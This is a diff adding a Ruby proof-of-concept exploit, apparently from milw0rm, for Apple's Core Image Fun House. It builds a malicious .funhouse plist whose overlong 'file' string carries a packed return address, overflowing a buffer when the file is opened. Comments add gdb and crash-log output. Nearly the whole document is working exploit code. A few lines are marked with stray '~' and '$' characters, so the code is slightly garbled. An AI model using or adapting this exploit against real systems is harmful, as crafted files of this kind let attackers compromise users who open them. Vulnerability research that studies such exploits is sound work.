@@ -1,0 +1,77 @@
+#!/usr/bin/ruby
+# Copyright (c) Netragard, LLC. adriel@netragard.com
+#
+# /Developer/Applications/Graphics Tools/Core Image Fun House.app
+# /Contents/MacOS/Core Image Fun House
+#
+# (gdb) x/10s 0xbfffddf7
+# 0xbfffddf7:      'Z' <repeats 101 times>, "DCBA center"
+#
+# 2007-07-10 21:15:34.573 Core Image Fun House[1061] CFLog (0):
+#        CFPropertyListCreateFromXMLData(): plist parse failed;
+#        the data is notproper UTF-8. The file name for this data
+#        could be:
+$
+#        /Users/test/Desktop/SuperTastey.funhouse/file.xml
+#        The parser will retry as in 10.2, but the problem should be
+#         corrected in the plist.
+#
+#  \x80-\xFF range that do not form proper utf8
+
+len = 300
+fname = "SuperTastey"
+retaddr = 0x0d0d0d0d  # There are lots of filtered chars!
+
+if File.exist?(fname + ".funhouse/file.xml")
+    File.unlink(fname + ".funhouse/file.xml")
+    Dir.rmdir(fname + ".funhouse")
+end
+Dir.mkdir(fname + ".funhouse")
+
+FUNSTUFF =
+"<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
+"<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\"
+\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">" +
+"<plist version=\"1.0\">" +
+"<dict>" +
+"<key>layers</key>" +
+"<array>" +
+"<dict>" +
+"<key>file</key>" +
+"<string>" +
+"Z" * len + [retaddr].pack("V") +
+"</string>" +
+"<key>offsetX</key>" +
+"<real>0.0</real>" +
+"<key>offsetY</key>" +
+"<real>0.0</real>" +
+"<key>type</key>" +
+"<string>image</string>" +
+"</dict>" +
+"<dict>" +
+"<key>classname</key>" +
+"<string>CIGlassDistortion</string>" +
+"<key>type</key>" +
+"<string>filter</string>" +
+"<key>values</key>" +
+"<dict>" +
+"<key>inputCenter_CIVectorValue</key>" +
+"<string>[150 150]</string>" +
+"<key>inputScale</key>" +
+"<real>200</real>" +
+"<key>inputTexture</key>" +
+"<string>" +
+"Z" * 50000 +
+"</string>" +
+"</dict>" +
+"</dict>" +
+"</array>" +
+"</dict>" +
+"</plist>" + "\n"
+
+target_file = File.open("SuperTastey.funhouse/file.xml", "w+") { |f|
+~  f.print(FUNSTUFF)  # weeeeee... lets have fun.
+~  f.close
+} 
+
+# milw0rm.com [2008-07-11]
